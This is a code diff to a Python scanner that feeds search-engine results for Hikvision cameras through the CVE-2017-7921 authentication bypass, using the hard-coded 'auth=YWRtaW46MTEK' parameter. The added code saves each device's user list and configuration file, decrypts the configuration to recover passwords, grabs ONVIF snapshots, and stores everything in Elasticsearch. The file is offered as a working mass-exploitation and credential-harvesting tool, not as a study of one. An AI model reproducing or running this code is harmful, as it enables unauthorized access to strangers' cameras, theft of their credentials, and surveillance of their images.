@@ -14,6 +14,7 @@ import math
 import os
 import threading
 import time
+import xml.etree.ElementTree as ET
 from concurrent.futures import ThreadPoolExecutor
 from queue import Queue
 
@@ -22,11 +23,14 @@ import requests
 import urllib3.exceptions
 from requests import ConnectTimeout
 
+from CVE_2017_7921 import configFileDecryptor
 from secret import clientHM194
 from utils import colorPrint
 
 INDEX_DEVICE = "devices"
 deviceQueue = Queue()
+CREATED_COUNT = 0
+UPDATED_COUNT = 0
 
 
 def save():
@@ -89,12 +93,12 @@ def save():
                 oldPort = oldPortInfo.get("port")
                 if port == oldPort:
                     if oldScannedAt >= scannedAt:
-                        pass
+                        continue
                     else:
                         # TODO：更新
                         # updateResp = clientHM194.update()
                         colorPrint.red(f"发现了一个目标[{ip}:{port}]需要更新[上一次扫描：{oldScannedAt}，最新一次扫描：{scannedAt}]")
-                        return
+                        continue
                 else:
                     _id = hit.get("_id")
                     source.setdefault("updatedAt", datetime.datetime.now())
@@ -105,25 +109,29 @@ def save():
                         updateResp: dict = clientHM194.update(index=INDEX_DEVICE, id=_id, doc=source)
                         updateResult = updateResp.get("result")
                         if updateResult == "updated":
-                            return
+                            continue
                         else:
-                            raise Exception("更新失败：" + json.dumps(updateResp, ensure_ascii=False, indent=4))
+                            colorPrint.red("更新失败：" + json.dumps(updateResp, ensure_ascii=False, indent=4))
+                            continue
                     except elasticsearch.exceptions.RequestError as e:
-                        raise Exception("更新失败：" + str(e) + json.dumps(source, ensure_ascii=False, indent=4))
+                        colorPrint.red("更新失败：" + str(e) + json.dumps(source, ensure_ascii=False, indent=4))
+                        continue
                     except Exception as e:
-                        raise Exception("更新失败：" + str(e) + json.dumps(source, ensure_ascii=False, indent=4))
+                        colorPrint.red("更新失败：" + str(e) + json.dumps(source, ensure_ascii=False, indent=4))
+                        continue
         else:
             indexResp = clientHM194.index(index=INDEX_DEVICE, document=device, timeout="10m")
             indexResult = indexResp.get("result")
             if indexResult == "created":
-                return
+                continue
             else:
-                raise Exception("新增失败：" + json.dumps(indexResp, ensure_ascii=False, indent=4))
+                colorPrint.red("新增失败：" + json.dumps(indexResp, ensure_ascii=False, indent=4))
+                continue
 
 
 def handle(match: dict):
     ip = match.get("ip")
-    portInfo = match.get("portinfo")
+    portInfo: dict = match.get("portinfo")
     port = portInfo.get("port")
     target = f"{ip}:{port}"
     securityUsersURL = f"http://{target}/Security/users?auth=YWRtaW46MTEK"
@@ -132,13 +140,51 @@ def handle(match: dict):
         resp = requests.get(url=securityUsersURL)
         if resp.status_code == 200:
             portInfo.setdefault("usersXml", time.time() - startedAt)
+            targetPath = "targets"
+            ipPath = os.path.join(targetPath, ip)
+            portPath = os.path.join(ipPath, str(port))
+            securityPath = os.path.join(portPath, "Security")
+            if not os.path.exists(securityPath):
+                os.makedirs(securityPath)
+            usersXmlFile = os.path.join(securityPath, "users.xml")
+            with open(usersXmlFile, "wb") as f:
+                f.write(resp.content)
+            tree = ET.parse(source=usersXmlFile)
+            users: list[dict] = []
+            userElList = tree.getroot()
+            for userEl in userElList:
+                user: dict = {}
+                for prob in userEl:
+                    if "id" in prob.tag:
+                        user.setdefault("id", prob.text)
+                    if "userName" in prob.tag:
+                        user.setdefault("username", prob.text)
+                    if "priority" in prob.tag:
+                        user.setdefault("priority", prob.text)
+                    if "ipAddress" in prob.tag:
+                        user.setdefault("ip", prob.text)
+                    if "macAddress" in prob.tag:
+                        user.setdefault("mac", prob.text)
+                    if "userLevel" in prob.tag:
+                        user.setdefault("level", prob.text)
+                users.append(user)
             startedAt = time.time()
             resp1 = requests.get(f"http://{target}/System/configurationFile?auth=YWRtaW46MTEK")
             if resp1.status_code == 200:
                 portInfo.setdefault("conf", time.time() - startedAt)
+                systemPath = os.path.join(portPath, "System")
+                configurationFile = os.path.join(systemPath, "configurationFile")
+                if not os.path.exists(systemPath):
+                    os.makedirs(systemPath)
+                with open(configurationFile, mode="wb") as f:
+                    f.write(resp1.content)
+                # 对配置文件进行解密
+                for user in users:
+                    passwords: list[str] = configFileDecryptor.guess(configurationFile, user.get("username"))
+                    user.setdefault("password", passwords)
                 imageUrl = f"http://{target}/onvif-http/snapshot?auth=YWRtaW46MTEK"
                 startedAt = time.time()
-                resp2 = requests.get(url=imageUrl, timeout=5 * 60)
+                resp2 = requests.get(url=imageUrl, timeout=5 * 60, headers={"Accept-Encoding": "gzip"})
                 if resp2.status_code == 200:
                     if resp2.headers.get("Content-Type") == "image/jpeg":
                         portInfo.setdefault("snapshot", time.time() - startedAt)
@@ -150,6 +196,7 @@ def handle(match: dict):
                     colorPrint.blue(f"{target} SNAPSHOT ERROR（{resp2.status_code})")
             else:
                 colorPrint.red(f"{target} ConfigurationFile ERROR（{resp1.status_code}）.")
+            portInfo.setdefault("users", users)
         else:
             colorPrint.red(f"{target} UsersXML ERROR（{str(resp.status_code)}）")
     except ConnectTimeout:
@@ -196,6 +243,9 @@ def get(cubeAuthorizationToken: str, cookie_jsluid_s: str,
         os.abort()
     elif statusCode == 200:
         matches: list[dict] = resp_json.get("matches")
+        print(f"第{page}页扫描出{len(matches)}个设备")
+        if len(matches) == 0:
+            os.abort()
         for match in matches:
             # threading.Thread(target=handle, args=(match,)).start()
             handle(match)
